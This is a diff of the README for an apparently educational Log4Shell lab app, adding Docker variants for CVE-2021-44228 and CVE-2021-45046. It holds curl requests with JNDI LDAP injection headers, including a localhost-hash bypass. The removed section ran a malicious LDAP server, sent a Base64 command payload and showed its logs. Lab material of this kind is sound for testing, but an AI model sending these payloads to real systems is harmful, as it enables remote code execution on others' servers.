@@ -1,78 +1,60 @@
-# Log4Shell sample vulnerable application (CVE-2021-44228)
+# Log4Shell sample vulnerable application
 
-This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
+This repository contains Spring Boot web applications vulnerable to [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
 
-It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.
 
-![](./screenshot.png)
-
-## Running the application
-
-Run it:
-
-```bash
-docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
-```
-
-Build it yourself (you don't need any Java-related tooling):
+## Variants
+### cve-2021-44228 (log4j-core: 2.14.1)
+* JDK: openjdk:8u312-jdk-slim
+* SpringLog4J: org.springframework.boot:spring-boot-starter-log4j2:2.6.1 (https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2/2.6.1)
+* log4j-core: 2.14.1
 
 ```bash
-docker build . -t vulnerable-app
-docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
+cd log4j-2.14.1
+sudo docker build -t vulnerable-app:log4j-2.14.1 .
+sudo docker run -p 8000:8080 --name vulnerable-app-log4j-2.14.1 --rm vulnerable-app:log4j-2.14.1
 ```
 
-## Exploitation steps
-
-*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*
-
-**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528)). Just append `web.archive.org` in front of the JNDIExploit download URL below to use the version cached by the Wayback Machine.*
-
-* Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server
+Trigger the vulnerability using:
 
 ```bash
-wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
-unzip JNDIExploit.v1.2.zip
-java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+curl 127.0.0.1:8000 -H 'X-Api-Version: ${jndi:ldap://your-private-ip.com/abc}'
 ```
 
-* Then, trigger the exploit using:
+### cve-2021-45046 (log4j-core: 2.15.0)
+https://www.whitesourcesoftware.com/resources/blog/log4j-vulnerability-cve-2021-45046/
+
+
+* JDK: openjdk:8u312-jdk-slim
+* SpringLog4J: org.springframework.boot:spring-boot-starter-log4j2:2.6.1 (https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2/2.6.1)
+* log4j-core: 2.15.0
 
 ```bash
-# will execute 'touch /tmp/pwned'
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+cd log4j-2.15.0
+sudo docker build -t vulnerable-app:log4j-2.15.0 .
+sudo docker run -p 8000:8080 --name vulnerable-app-log4j-2.15.0 --rm vulnerable-app:log4j-2.15.0
 ```
 
-* Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:
-
-```
-[+] LDAP Server Start Listening on 1389...
-[+] HTTP Server Start Listening on 8888...
-[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
-[+] Paylaod: command
-[+] Command: touch /tmp/pwned
-
-[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
-[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
-[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
-[+] Receive ClassRequest: Exploitjkk87OnvOH.class
-[+] Response Code: 200
+Does not work anymore:
+```bash
+curl 127.0.0.1:8000/old -H 'X-Api-Version: ${jndi:ldap://your-private-ip.com/abc}'
 ```
 
-* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:
-
-```
-$ docker exec vulnerable-app ls /tmp
-...
-pwned
-...
+Trigger the vulnerability using:
+```bash
+curl 127.0.0.1:8000 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1#your-private-ip.com/abc}'
 ```
 
-## Reference
+Why this works: https://twitter.com/marcioalm/status/1471742744347348997
 
-https://www.lunasec.io/docs/blog/log4j-zero-day/
-https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
 
-## Contributors
+When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data using a JNDI Lookup pattern, resulting in an information leak and remote code execution in some environments and local code execution in all environments; remote code execution has been demonstrated on MacOS, Fedora, Arch Linux, and **Alpine Linux**.
+https://logging.apache.org/log4j/2.x/security.html
+
+## Forked from
+https://github.com/christophetd/log4shell-vulnerable-app
+
+thanks to
 
 [@christophetd](https://twitter.com/christophetd)
 [@rayhan0x01](https://twitter.com/rayhan0x01)
